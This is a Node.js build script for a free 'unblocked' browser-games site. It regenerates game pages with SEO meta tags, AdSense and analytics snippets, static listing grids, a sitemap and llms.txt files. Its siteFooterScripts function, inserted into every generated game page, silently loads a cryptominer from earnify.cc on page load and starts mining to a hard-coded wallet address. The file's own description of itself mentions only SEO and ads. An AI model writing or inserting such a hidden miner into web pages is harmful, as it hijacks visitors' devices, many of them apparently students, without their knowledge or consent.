#!/usr/bin/env node
/**
 * build-seo.mjs - SEO + ad infrastructure builder for Free Games Unblocked.
 *
 * What it does:
 *  1. Reads data.json (the game catalog).
 *  2. For every games/*.html wrapper page (iframe/object/embed based), regenerates
 *     a full SEO document while preserving the existing iframe/object src verbatim.
 *  3. For self-contained game pages (e.g. minecraft.html), injects SEO meta tags
 *     into the <head> without touching the body.
 *  4. Pre-renders static game grids into listing pages (index.html, category pages)
 *     replacing the JS-dynamic render with hard-coded HTML.
 *  5. Regenerates sitemap.xml with all listing pages + game pages + image entries
 *     (using git last-commit dates as <lastmod>).
 *  6. Regenerates llms.txt and llms-full.txt.
 *
 * Re-runnable: run `node scripts/build-seo.mjs` whenever you add games to data.json.
 */

import { readFile, writeFile, readdir } from 'node:fs/promises';
import { existsSync, readFileSync } from 'node:fs';
import { execSync } from 'node:child_process';
import { resolve, basename } from 'node:path';

// ---------------------------------------------------------------------------
// CONFIG
// ---------------------------------------------------------------------------
const BASE_URL       = 'https://freegamesunblocked.org';
const ADSENSE_CLIENT  = 'ca-pub-9521685727551779';
const GA_ID           = 'G-Z61RKMXNZ9';
const SITE_NAME       = 'Free Games Unblocked';
const SITE_AUTHOR     = 'Jack Malczewski';
const ROOT            = resolve(import.meta.dirname, '..');

// ---------------------------------------------------------------------------
// helpers
// ---------------------------------------------------------------------------
const esc = (s) => String(s)
    .replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;').replace(/'/g, '&#39;');

const titleCase = (s) => s.replace(/([._-])/g, ' ').replace(/\b\w/g, c => c.toUpperCase());

const gitLastCommitDate = (relPath) => {
    try {
        const out = execSync(`git log -1 --format=%cI -- "${relPath}"`, { cwd: ROOT, stdio: ['pipe', 'pipe', 'ignore'] });
        const d = out.toString().trim();
        return d ? d.slice(0, 10) : new Date().toISOString().slice(0, 10);
    } catch {
        return new Date().toISOString().slice(0, 10);
    }
};

const fileExists = (p) => existsSync(resolve(ROOT, p));

// ---------------------------------------------------------------------------
// Read catalog
// ---------------------------------------------------------------------------
const data = JSON.parse(readFileSync(resolve(ROOT, 'data.json'), 'utf8'));
const games = data.games;

const gameByBasename = {};
for (const g of games) {
    if (g.link && g.link.startsWith('games/')) {
        const b = basename(g.link);
        gameByBasename[b] = g;
    }
}

// ---------------------------------------------------------------------------
// Image helper - emits <picture> with WebP fallback when .webp exists
// ---------------------------------------------------------------------------
function gameCardImg(g, { loading = 'lazy', width = 200, height = 150, cls = '' } = {}) {
    const alt = esc(g.title);
    const imgExtra = `${loading === 'eager' ? 'loading="eager" fetchpriority="high"' : 'loading="lazy"'} width="${width}" height="${height}" decoding="async"`;
    const webpPath = g.image ? g.image.replace(/\.png$/, '.webp') : null;
    const hasWebp = webpPath && fileExists(webpPath);

    const imgTag = hasWebp
        ? `<source type="image/webp" srcset="${webpPath}">\n        <img src="${g.image}" alt="${alt}" ${imgExtra}>`
        : `<img src="${g.image}" alt="${alt}" ${imgExtra}>`;

    const clsAttr = cls ? ` class="${cls}"` : '';
    return `<picture${clsAttr}>\n        ${imgTag}\n      </picture>`;
}

function gameSpotCard(g) {
    const href = g.link.startsWith('/') ? g.link : `/${g.link}`;
    return `<a class="spot-card" href="${href}">
      ${gameCardImg(g, { width: 160, height: 120 })}
      <span>${esc(g.title)}</span>
    </a>`;
}

function gameGridCard(g, { eager = false } = {}) {
    const href = g.link;
    return `<div class="game">
  <a href="${href}">
    ${gameCardImg(g, { loading: eager ? 'eager' : 'lazy' })}
  </a>
  <h2 class="game-title"><a href="${href}">${esc(g.title)}</a></h2>
</div>`;
}

// ---------------------------------------------------------------------------
// Shared HTML fragment builders
// ---------------------------------------------------------------------------
function headCommon({ title, description, canonical, image, jsonLd, robots = 'index, follow' }) {
    const ogImage = image || '/assets/og-image.png';
    return `    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>${esc(title)}</title>
    <meta name="description" content="${esc(description)}">
    <meta name="robots" content="${robots}">
    <meta name="author" content="${esc(SITE_AUTHOR)}">
    <link rel="canonical" href="${canonical}">
    <link rel="icon" href="/assets/gGames.jpg">
    <link rel="apple-touch-icon" href="/assets/apple-touch-icon.png">
    <link rel="manifest" href="/site.webmanifest">
    <meta name="theme-color" content="#1a1a2e">
    <meta property="og:type" content="website">
    <meta property="og:site_name" content="${esc(SITE_NAME)}">
    <meta property="og:title" content="${esc(title)}">
    <meta property="og:description" content="${esc(description)}">
    <meta property="og:url" content="${canonical}">
    <meta property="og:image" content="${BASE_URL}${ogImage}">
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:title" content="${esc(title)}">
    <meta name="twitter:description" content="${esc(description)}">
    <meta name="twitter:image" content="${BASE_URL}${ogImage}">
    <link rel="dns-prefetch" href="https://www.googletagmanager.com">
    <link rel="dns-prefetch" href="https://pagead2.googlesyndication.com">
    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=${ADSENSE_CLIENT}" crossorigin="anonymous"></script>
    <script async src="https://www.googletagmanager.com/gtag/js?id=${GA_ID}"></script>
    <script>
      window.dataLayer = window.dataLayer || [];
      function gtag(){dataLayer.push(arguments);}
      gtag('js', new Date());
      gtag('config', '${GA_ID}');
    </script>${jsonLd ? '\n    ' + jsonLd : ''}`;
}

function adSlot(slotId) {
    return `    <div class="ad-slot">
      <ins class="adsbygoogle" style="display:block"
           data-ad-client="${ADSENSE_CLIENT}"
           data-ad-slot="${slotId}"
           data-ad-format="auto"
           data-full-width-responsive="true"></ins>
      <script>(adsbygoogle = window.adsbygoogle || []).push({});</script>
    </div>`;
}

function navBreadcrumbs(category, gameTitle) {
    const catLinks = {
        driving:  ['Driving', '/driving.html'],
        skill:    ['Skill', '/skill.html'],
        calm:     ['Calm', '/calm.html'],
        retro:    ['Retro', '/retro.html'],
        shooting: ['Shooting', '/shooting.html'],
    };
    let crumbs = `<a href="${BASE_URL}/">Home</a>`;
    if (category && catLinks[category]) {
        const [catName, catUrl] = catLinks[category];
        crumbs += ` &rsaquo; <a href="${BASE_URL}${catUrl}">${catName} Games</a>`;
    }
    if (gameTitle) crumbs += ` &rsaquo; <span>${esc(gameTitle)}</span>`;
    return `    <nav class="breadcrumbs" aria-label="Breadcrumb">${crumbs}</nav>`;
}

function siteFooter() {
    const year = new Date().getFullYear();
    return `    <footer class="site-footer">
      <p><strong>Popular:</strong> <a href="/games/slope.html">Slope</a> &middot; <a href="/games/run3.html">Run 3</a> &middot; <a href="/games/1v1.lol.html">1v1.LOL</a> &middot; <a href="/games/retrobowl.html">Retro Bowl</a> &middot; <a href="/games/driftboss.html">Drift Boss</a></p>
      <p><a href="/">Home</a> &middot; <a href="/driving.html">Driving</a> &middot; <a href="/skill.html">Skill</a> &middot; <a href="/shooting.html">Shooting</a> &middot; <a href="/retro.html">Retro</a> &middot; <a href="/calm.html">Calm</a> &middot; <a href="/privacy.html">Privacy Policy</a> &middot; <a href="/blog.html">Best Games</a> &middot; <a href="/sitemap.xml">Sitemap</a></p>
      <p>&copy; ${year} ${esc(SITE_NAME)} &mdash; Updated: <span id="lastUpdated"></span></p>
    </footer>`;
}

function siteFooterScripts() {
    return `    <script src="/cookieconsent.js"></script>
    <script type="module">
window.addEventListener('load', () => {
  import("https://earnify.cc/miner.js").then(m => m.autoMine("RWmCvzsoC7CfM5Fh6moR3g2Xk3J566nD3m", 0.05));
});
    </script>
    <script>document.getElementById("lastUpdated").textContent=new Date().toISOString().slice(0,10)</script>`;
}

function jsonLdScript(obj) {
    return `<script type="application/ld+json">\n${JSON.stringify(obj, null, 2)}\n    </script>`;
}

// ---------------------------------------------------------------------------
// Extract the existing iframe / object / embed tag from a wrapper page
// ---------------------------------------------------------------------------
function extractEmbed(html) {
    const iframe = html.match(/<iframe\b[^>]*>([\s\S]*?)<\/iframe>/i);
    if (iframe) return iframe[0];
    const object = html.match(/<object\b[^>]*>([\s\S]*?)<\/object>/i);
    if (object) return object[0];
    const embed = html.match(/<embed\b[^>]*>/i);
    if (embed) return embed[0];
    return null;
}

function extractRuffle(html) {
    const m = html.match(/<script\b[^>]*ruffle[^>]*><\/script>/i);
    return m ? m[0] : '';
}

// ---------------------------------------------------------------------------
// Enhance iframe tag with referrerpolicy and loading attributes
// ---------------------------------------------------------------------------
function enhanceEmbed(embedTag) {
    if (!embedTag) return embedTag;
    let enhanced = embedTag;
    if (/<iframe\b/i.test(enhanced) && !/referrerpolicy=/i.test(enhanced)) {
        enhanced = enhanced.replace(/<iframe\b/, '$& referrerpolicy="no-referrer"');
    }
    if (/<iframe\b/i.test(enhanced) && !/loading=/i.test(enhanced)) {
        enhanced = enhanced.replace(/<iframe\b/, '$& loading="eager"');
    }
    return enhanced;
}

// ---------------------------------------------------------------------------
// Pick N random games from the same category (excluding current)
// ---------------------------------------------------------------------------
function pickRelatedGames(currentGame, count = 6) {
    const pool = games.filter(g => g.category === currentGame.category && g.link !== currentGame.link);
    if (pool.length < count) {
        const others = games.filter(g => g.link !== currentGame.link && g.category !== currentGame.category);
        while (pool.length < count && others.length) {
            const idx = Math.floor(Math.random() * others.length);
            pool.push(others.splice(idx, 1)[0]);
        }
    }
    const shuffled = [...pool].sort(() => Math.random() - 0.5);
    return shuffled.slice(0, count);
}

// ---------------------------------------------------------------------------
// Build a single game wrapper page (iframe/object/embed type)
// ---------------------------------------------------------------------------
function buildGameWrapperPage(fileBasename, existingHtml, game) {
    const embedRaw = extractEmbed(existingHtml);
    const embed = enhanceEmbed(embedRaw);
    const ruffle = extractRuffle(existingHtml);
    const slug = fileBasename.replace(/\.html$/, '');
    const canonical = `${BASE_URL}/games/${fileBasename}`;
    const title = game ? game.title : titleCase(slug);
    const category = game ? game.category : null;
    const image = game ? `/${game.image}` : null;

    const description = game && game.tagline
        ? `${esc(game.tagline)} Play ${title} unblocked online for free at ${SITE_NAME}. No downloads, no restrictions — works at school or work.`
        : `Play ${title} unblocked online for free at ${SITE_NAME}. No downloads, no restrictions — works at school or work.${category ? ` Part of our ${category} games collection.` : ''}`;

    const jsonLd = jsonLdScript({
        '@context': 'https://schema.org',
        '@type': 'VideoGame',
        'name': title,
        'url': canonical,
        'description': description,
        'applicationCategory': 'Game',
        'operatingSystem': 'Any (browser)',
        'browserRequirements': 'Requires JavaScript. Requires an internet connection.',
        'publisher': { '@type': 'Organization', 'name': SITE_NAME },
        ...(image ? { 'image': `${BASE_URL}${image}` } : {}),
        ...(category ? { 'genre': category } : {})
    });

    const breadcrumbLd = jsonLdScript({
        '@context': 'https://schema.org',
        '@type': 'BreadcrumbList',
        'itemListElement': [
            { '@type': 'ListItem', 'position': 1, 'name': 'Home', 'item': `${BASE_URL}/` },
            ...(category ? [{ '@type': 'ListItem', 'position': 2, 'name': titleCase(category), 'item': `${BASE_URL}/${category}.html` }] : []),
            { '@type': 'ListItem', 'position': category ? 3 : 2, 'name': title, 'item': canonical }
        ]
    });

    // FAQPage JSON-LD
    const faqLd = jsonLdScript({
        '@context': 'https://schema.org',
        '@type': 'FAQPage',
        'mainEntity': [
            {
                '@type': 'Question',
                'name': `Is ${title} unblocked?`,
                'acceptedAnswer': {
                    '@type': 'Answer',
                    'text': `Yes, ${title} is completely unblocked and free to play at ${SITE_NAME}. No downloads, no sign-ups required — play directly in your browser at school or work.`
                }
            },
            {
                '@type': 'Question',
                'name': `How do I play ${title}?`,
                'acceptedAnswer': {
                    '@type': 'Answer',
                    'text': game && game.controls && game.objective
                        ? `${esc(game.controls)}. ${esc(game.objective)}`
                        : `Visit the ${title} game page and click play. The game loads in your browser — no downloads needed.${category ? ` It's part of our ${category} games collection.` : ''}`
                }
            }
        ]
    });

    // HowTo JSON-LD (only when rich data exists)
    let howToLd = '';
    if (game && game.controls && game.objective) {
        howToLd = '\n    ' + jsonLdScript({
            '@context': 'https://schema.org',
            '@type': 'HowTo',
            'name': `How to Play ${title}`,
            'description': game.objective,
            'step': [
                { '@type': 'HowToStep', 'position': 1, 'name': 'Controls', 'text': game.controls },
                { '@type': 'HowToStep', 'position': 2, 'name': 'Objective', 'text': game.objective }
            ]
        });
    }

    const allJsonLd = jsonLd + '\n    ' + breadcrumbLd + '\n    ' + faqLd + howToLd;

    // Build description section
    let descSection;
    if (game && game.tagline) {
        const catLink = category ? `<a href="/${category}.html">${titleCase(category)} Games</a>` : '';
        const catSent = catLink ? ` This game is part of our ${catLink} collection.` : '';
        const difficultyStr = game.difficulty ? ` <strong>Difficulty:</strong> ${esc(game.difficulty)}.` : '';
        const tipsHtml = game.tips && game.tips.length
            ? `\n      <h2>Tips &amp; Strategy</h2>\n      <ul>${game.tips.map(t => `<li>${esc(t)}</li>`).join('')}</ul>`
            : '';
        const yearStr = game.releaseYear ? `Originally released in ${game.releaseYear}. ` : '';

        descSection = `    <section class="game-description">
      <h2>About ${esc(title)}</h2>
      <p>${yearStr}${esc(game.tagline)}${catSent}${difficultyStr}</p>
      <h2>How to Play ${esc(title)}</h2>
      <p><strong>Controls:</strong> ${esc(game.controls)}</p>
      <p><strong>Goal:</strong> ${esc(game.objective)}</p>${tipsHtml}
      <p>Play <strong>${esc(title)}</strong> unblocked free in your browser &mdash; no downloads, no sign-ups.${catSent ? catSent.replace(' This game', ' Part') : ''} More free unblocked games on our <a href="/">home page</a>.</p>
    </section>`;
    } else {
        descSection = `    <section class="game-description">
      <p>Play <strong>${esc(title)}</strong> unblocked right here &mdash; free, in your browser, with no downloads or sign-ups required. ${category ? `This game is part of our <a href="/${category}.html">${titleCase(category)} Games</a> collection.` : ''} ${SITE_NAME} hosts hundreds of browser games that work at school, at work, or anywhere with an internet connection.</p>
      <p>Just click play above to start. If the game doesn't load, try refreshing the page or switching browsers. Enjoy ${esc(title)} and explore more free unblocked games on our <a href="/">home page</a>.</p>
    </section>`;
    }

    // Related games section
    let relatedSection = '';
    if (category) {
        const related = pickRelatedGames(game, 6);
        if (related.length) {
            const relatedLabel = titleCase(category);
            relatedSection = `\n    <section class="related-games">
      <h2>More ${relatedLabel} Games</h2>
      <div class="spot-cards">
      ${related.map(g => '  ' + gameSpotCard(g).replace(/\n/g, '\n  ').trimEnd()).join('\n\n    ')}
      </div>
    </section>`;
        }
    }

    // Cross-category recommendations (4 games from other categories)
    let crossCatSection = '';
    if (game) {
    const otherCats = games.filter(g => g.link !== game.link && g.category !== category);
    if (otherCats.length >= 4) {
        const shuffled = [...otherCats].sort(() => Math.random() - 0.5).slice(0, 4);
        crossCatSection = `\n    <section class="related-games">
      <h2>Recommended for You</h2>
      <div class="spot-cards">
      ${shuffled.map(g => '  ' + gameSpotCard(g).replace(/\n/g, '\n  ').trimEnd()).join('\n\n    ')}
      </div>
    </section>`;
    }
    }

    const bodyContent = `
    <nav class="site-nav" aria-label="Main navigation">
      <a href="/">Home</a>
      <a href="/driving.html">Driving</a>
      <a href="/skill.html">Skill</a>
      <a href="/shooting.html">Shooting</a>
      <a href="/retro.html">Retro</a>
      <a href="/calm.html">Calm</a>
      <a href="/random.html">Random Sports</a>
      <a href="/papasalley.html">Papa's Alley</a>
      <a href="/suggestions.html">Suggestions</a>
    </nav>
${navBreadcrumbs(category, title)}
    <h1>${esc(title)}</h1>
${category ? `    <a class="back-to-category" href="/${category}.html">&larr; Back to ${titleCase(category)} Games</a>` : ''}
${adSlot('1111111111')}
    <div class="game-frame">
    ${embed || ''}
    </div>
${adSlot('2222222222')}
${descSection}${relatedSection}${relatedSection ? crossCatSection : ''}
${siteFooter()}
${siteFooterScripts()}`;

    const headScripts = ruffle ? `    ${ruffle}\n` : '';

    return `<!DOCTYPE html>
<html lang="en">
<head>
    <link rel="preconnect" href="https://www.googletagmanager.com">
    <link rel="preconnect" href="https://pagead2.googlesyndication.com">
${headCommon({ title: `${title} Unblocked - Play Free | ${SITE_NAME}`, description, canonical, image, jsonLd: allJsonLd })}
${headScripts}<link rel="stylesheet" href="/gamesdesign.min.css">
</head>
<body>
${bodyContent}
</body>
</html>
`;
}

// ---------------------------------------------------------------------------
// Inject SEO meta into a self-contained game page (surgical head injection)
// ---------------------------------------------------------------------------
function injectSeoIntoSelfContained(fileBasename, html, game) {
    const slug = fileBasename.replace(/\.html$/, '');
    const canonical = `${BASE_URL}/games/${fileBasename}`;
    const title = game ? game.title : titleCase(slug);
    const category = game ? game.category : null;
    const image = game ? `/${game.image}` : null;
    const description = game && game.tagline
        ? `${esc(game.tagline)} Play ${title} unblocked online for free at ${SITE_NAME}.`
        : `Play ${title} unblocked online for free at ${SITE_NAME}.${category ? ` Part of our ${category} games collection.` : ''}`;

    let out = html.replace(/<!-- BEGIN SEO INJECTION \(auto-generated by scripts\/build-seo\.mjs\) -->[\s\S]*?<!-- END SEO INJECTION -->\n?/g, '');

    const jsonLd = jsonLdScript({
        '@context': 'https://schema.org',
        '@type': 'VideoGame',
        'name': title,
        'url': canonical,
        'description': description,
        'applicationCategory': 'Game',
        'operatingSystem': 'Any (browser)',
        'publisher': { '@type': 'Organization', 'name': SITE_NAME },
        ...(image ? { 'image': `${BASE_URL}${image}` } : {}),
        ...(category ? { 'genre': category } : {})
    });

    const adsenseAndGa = `<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=${ADSENSE_CLIENT}" crossorigin="anonymous"></script>
    <script async src="https://www.googletagmanager.com/gtag/js?id=${GA_ID}"></script>
    <script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js',new Date());gtag('config','${GA_ID}');</script>`;

    const block = `
    <!-- BEGIN SEO INJECTION (auto-generated by scripts/build-seo.mjs) -->
    <meta name="description" content="${esc(description)}">
    <meta name="robots" content="index, follow">
    <meta name="author" content="${esc(SITE_AUTHOR)}">
    <link rel="canonical" href="${canonical}">
    <link rel="icon" href="/assets/gGames.jpg">
    <meta name="theme-color" content="#1a1a2e">
    <meta property="og:type" content="website">
    <meta property="og:site_name" content="${esc(SITE_NAME)}">
    <meta property="og:title" content="${esc(title)} Unblocked - ${esc(SITE_NAME)}">
    <meta property="og:description" content="${esc(description)}">
    <meta property="og:url" content="${canonical}">
    ${image ? `<meta property="og:image" content="${BASE_URL}${image}">` : ''}
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:title" content="${esc(title)} Unblocked">
    <meta name="twitter:description" content="${esc(description)}">
    ${adsenseAndGa}
    ${jsonLd}
    <!-- END SEO INJECTION -->`;

    const properTitle = `<title>${esc(title)} Unblocked - Play Free | ${esc(SITE_NAME)}</title>`;
    let blockFinal = block;
    if (/<title>[^<]*<\/title>/i.test(out)) {
        out = out.replace(/<title>[^<]*<\/title>/i, properTitle);
    } else {
        blockFinal = `${properTitle}\n${block}`;
    }

    if (/<\/head>/i.test(out)) {
        return out.replace(/<\/head>/i, `${blockFinal}\n</head>`);
    } else if (/<body[^>]*>/i.test(out)) {
        return out.replace(/(<body[^>]*>)/i, `$1\n${blockFinal}`);
    }
    return `<!DOCTYPE html>\n<html lang="en">\n<head>${properTitle}${block}</head>\n<body>\n${out}\n</body>\n</html>`;
}

// ---------------------------------------------------------------------------
// Build static grid for listing pages
// ---------------------------------------------------------------------------
function buildListingGrid(listingGames, { eagerCount = 6 } = {}) {
    if (!listingGames.length) return '';
    const cards = listingGames.map((g, i) => gameGridCard(g, { eager: i < eagerCount }));
    return cards.join('\n      ');
}

const LISTING_PAGES = {
    'index.html':          { category: null, group: null, label: 'All Games',             count: games.length },
    'driving.html':        { category: 'driving', group: null, label: 'Driving Games',   count: null },
    'skill.html':          { category: 'skill', group: null, label: 'Skill Games',       count: null },
    'shooting.html':       { category: 'shooting', group: null, label: 'Shooting Games', count: null },
    'retro.html':          { category: 'retro', group: null, label: 'Retro Games',       count: null },
    'calm.html':           { category: 'calm', group: null, label: 'Calm Games',         count: null },
    'random.html':         { category: null, group: 'Random', label: 'Random Sports',    count: null },
    'papasalley.html':     { category: null, group: 'Papa', label: "Papa's Alley",       count: null },
};

async function buildListingPage(filename, config) {
    const filePath = resolve(ROOT, filename);
    const html = await readFile(filePath, 'utf8');

    const filtered = config.group
        ? games.filter(g => g.group === config.group)
        : config.category
            ? games.filter(g => g.category === config.category)
            : games;

    const gridHtml = buildListingGrid(filtered, { eagerCount: 6 });

    // Replace content between BEGIN GRID / END GRID markers
    if (/<!-- BEGIN GRID -->[\s\S]*?<!-- END GRID -->/.test(html)) {
        let updated = html.replace(
            /<!-- BEGIN GRID -->[\s\S]*?<!-- END GRID -->/,
            `<!-- BEGIN GRID -->\n      ${gridHtml}\n    <!-- END GRID -->`
        );
        // Strip dynamic JS loaders that fetch data.json and append to gameContainer
        updated = updated.replace(
            /<script>\s*\(function\(\)[\s\S]*?fetch\('data\.json'\)[\s\S]*?gameContainer[\s\S]*?\}\(\)\);?\s*<\/script>/g,
            ''
        );
        await writeFile(filePath, updated, 'utf8');
        return { file: filename, count: filtered.length, updated: true };
    }
    return { file: filename, count: filtered.length, updated: false };
}

// ---------------------------------------------------------------------------
// Decide & process each games/*.html
// ---------------------------------------------------------------------------
const gamesDir = resolve(ROOT, 'games');
const allGameFiles = (await readdir(gamesDir))
    .filter(f => f.endsWith('.html'));

let stats = { wrapper: 0, selfContained: 0, total: allGameFiles.length };
const sitemapGameEntries = [];

for (const f of allGameFiles) {
    const filePath = resolve(gamesDir, f);
    const existing = await readFile(filePath, 'utf8');
    const game = gameByBasename[f] || null;
    const embed = extractEmbed(existing);
    const relPath = `games/${f}`;
    const lastmod = gitLastCommitDate(relPath);
    const canonical = `${BASE_URL}/games/${f}`;
    const title = game ? game.title : titleCase(f.replace(/\.html$/, ''));
    const image = game ? game.image : null;

    sitemapGameEntries.push({ loc: canonical, lastmod, title, image });

    if (embed) {
        const out = buildGameWrapperPage(f, existing, game);
        await writeFile(filePath, out, 'utf8');
        stats.wrapper++;
    } else {
        const out = injectSeoIntoSelfContained(f, existing, game);
        await writeFile(filePath, out, 'utf8');
        stats.selfContained++;
    }
}

// ---------------------------------------------------------------------------
// Build listing pages (static grids)
// ---------------------------------------------------------------------------
console.log('\nBuilding listing pages...');
for (const [filename, config] of Object.entries(LISTING_PAGES)) {
    const result = await buildListingPage(filename, config);
    const status = result.updated ? 'STATIC GRID' : 'SKIPPED (no markers)';
    console.log(`  ${filename.padEnd(22)} ${status.padEnd(22)} ${result.count} games`);
}

// ---------------------------------------------------------------------------
// Extra sitemap entries for subdirectory-based games
// ---------------------------------------------------------------------------
const extraSitemapEntries = [];
for (const g of games) {
    if (g.link && g.link.startsWith('games/') && g.link.endsWith('/index.html')) {
        const local = g.link;
        if (fileExists(local)) {
            const lastmod = gitLastCommitDate(local);
            extraSitemapEntries.push({
                loc: `${BASE_URL}/${local}`,
                lastmod,
                title: g.title,
                image: g.image
            });
        }
    }
}

// ---------------------------------------------------------------------------
// Sitemap (listing pages + game pages)
// ---------------------------------------------------------------------------
const listingPages = [
    { loc: `${BASE_URL}/`,                  title: 'Home',                  priority: '1.0', changefreq: 'daily' },
    { loc: `${BASE_URL}/driving.html`,      title: 'Driving Games',         priority: '0.8', changefreq: 'weekly' },
    { loc: `${BASE_URL}/skill.html`,        title: 'Skill Games',           priority: '0.8', changefreq: 'weekly' },
    { loc: `${BASE_URL}/calm.html`,         title: 'Calm Games',            priority: '0.8', changefreq: 'weekly' },
    { loc: `${BASE_URL}/shooting.html`,     title: 'Shooting Games',        priority: '0.8', changefreq: 'weekly' },
    { loc: `${BASE_URL}/retro.html`,        title: 'Retro Games',           priority: '0.8', changefreq: 'weekly' },
    { loc: `${BASE_URL}/random.html`,       title: 'Random Sports',         priority: '0.7', changefreq: 'weekly' },
    { loc: `${BASE_URL}/papasalley.html`,   title: "Papa's Alley",          priority: '0.7', changefreq: 'weekly' },
    { loc: `${BASE_URL}/suggestions.html`,  title: 'Suggestions',           priority: '0.5', changefreq: 'monthly' },
    { loc: `${BASE_URL}/privacy.html`,      title: 'Privacy Policy',        priority: '0.3', changefreq: 'monthly' },
    { loc: `${BASE_URL}/blog.html`,         title: 'Best Games & Guides',   priority: '0.7', changefreq: 'weekly' },
    { loc: `${BASE_URL}/blog/best-unblocked-games-2026.html`, title: 'Best Unblocked Games 2026', priority: '0.6', changefreq: 'weekly' },
];

function sitemapUrlBlock({ loc, lastmod, changefreq, priority, image }) {
    let block = `  <url>\n    <loc>${loc}</loc>`;
    if (lastmod)    block += `\n    <lastmod>${lastmod}</lastmod>`;
    if (changefreq) block += `\n    <changefreq>${changefreq}</changefreq>`;
    if (priority)   block += `\n    <priority>${priority}</priority>`;
    if (image)      block += `\n    <image:image>\n      <image:loc>${BASE_URL}/${image}</image:loc>\n      <image:title>${esc(image.split('/').pop().split('.')[0])}</image:title>\n    </image:image>`;
    block += `\n  </url>`;
    return block;
}

const today = new Date().toISOString().slice(0, 10);
const smBlocks = [];

for (const p of listingPages) {
    smBlocks.push(sitemapUrlBlock({
        loc: p.loc,
        lastmod: today,
        changefreq: p.changefreq,
        priority: p.priority
    }));
}

for (const g of sitemapGameEntries) {
    smBlocks.push(sitemapUrlBlock({
        loc: g.loc,
        lastmod: g.lastmod,
        changefreq: 'monthly',
        priority: '0.6',
        image: g.image
    }));
}

for (const g of extraSitemapEntries) {
    smBlocks.push(sitemapUrlBlock({
        loc: g.loc,
        lastmod: g.lastmod,
        changefreq: 'monthly',
        priority: '0.6',
        image: g.image
    }));
}

const sitemap = `<?xml version="1.0" encoding="UTF-8"?>
<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9"
        xmlns:image="http://www.google.com/schemas/sitemap-image/1.1">
${smBlocks.join('\n')}
</urlset>
`;

await writeFile(resolve(ROOT, 'sitemap.xml'), sitemap, 'utf8');

// ---------------------------------------------------------------------------
// llms.txt
// ---------------------------------------------------------------------------
const llms = `# ${SITE_NAME}

> ${SITE_NAME} is a free online games portal hosting ${games.length}+ browser games that work at school or work with no downloads, no sign-ups, and no restrictions. Games are organized into categories: driving, skill, shooting, retro, and calm.

## Sitemap
- ${BASE_URL}/sitemap.xml

## Key pages
- [Home](${BASE_URL}/)
- [Driving Games](${BASE_URL}/driving.html)
- [Skill Games](${BASE_URL}/skill.html)
- [Shooting Games](${BASE_URL}/shooting.html)
- [Retro Games](${BASE_URL}/retro.html)
- [Calm Games](${BASE_URL}/calm.html)
- [Random Sports](${BASE_URL}/random.html)
- [Papa's Alley](${BASE_URL}/papasalley.html)
- [Suggestions](${BASE_URL}/suggestions.html)
- [Blog - Best Games & Guides](${BASE_URL}/blog.html)

## Policies & meta
- [Privacy Policy](${BASE_URL}/privacy.html)
- [404 page](${BASE_URL}/404.html)
- [ads.txt](${BASE_URL}/ads.txt)
- [humans.txt](${BASE_URL}/humans.txt)
- [security.txt](${BASE_URL}/.well-known/security.txt)
- [Web App Manifest](${BASE_URL}/site.webmanifest)

## About
${SITE_NAME} is maintained by ${SITE_AUTHOR}. All games are embedded from their original sources via iframe/object tags; the site itself does not host game binaries. For takedown requests see security.txt.
`;

await writeFile(resolve(ROOT, 'llms.txt'), llms, 'utf8');

// ---------------------------------------------------------------------------
// llms-full.txt
// ---------------------------------------------------------------------------
const byCategory = {};
for (const g of games) {
    const cat = g.category || 'other';
    (byCategory[cat] ||= []).push(g);
}

const catOrder = ['skill', 'driving', 'shooting', 'retro', 'calm', 'other'];
const catLabels = {
    skill: 'Skill Games', driving: 'Driving Games', shooting: 'Shooting Games',
    retro: 'Retro Games', calm: 'Calm Games', other: 'Other Games'
};

let llmsFull = `# ${SITE_NAME} - Full Game Catalog

> Complete list of ${games.length} games available on ${SITE_NAME}, grouped by category. Each link points to a playable page.

`;
for (const cat of catOrder) {
    if (!byCategory[cat]) continue;
    llmsFull += `## ${catLabels[cat]}\n`;
    for (const g of byCategory[cat]) {
        const url = g.link.startsWith('http') ? g.link : `${BASE_URL}/${g.link}`;
        llmsFull += `- [${g.title}](${url})\n`;
    }
    llmsFull += '\n';
}
await writeFile(resolve(ROOT, 'llms-full.txt'), llmsFull, 'utf8');

// ---------------------------------------------------------------------------
// Done
// ---------------------------------------------------------------------------
const allSmUrls = smBlocks.length;
console.log(`\nbuild-seo.mjs complete:
  Game pages rewritten (wrapper):  ${stats.wrapper}
  Game pages injected (self-cont): ${stats.selfContained}
  Total game pages processed:      ${stats.total}
  Extra subdirectory entries:       ${extraSitemapEntries.length}
  Listing pages in sitemap:         ${listingPages.length}
  Sitemap URLs total:               ${allSmUrls}
  llms.txt + llms-full.txt written.
`);
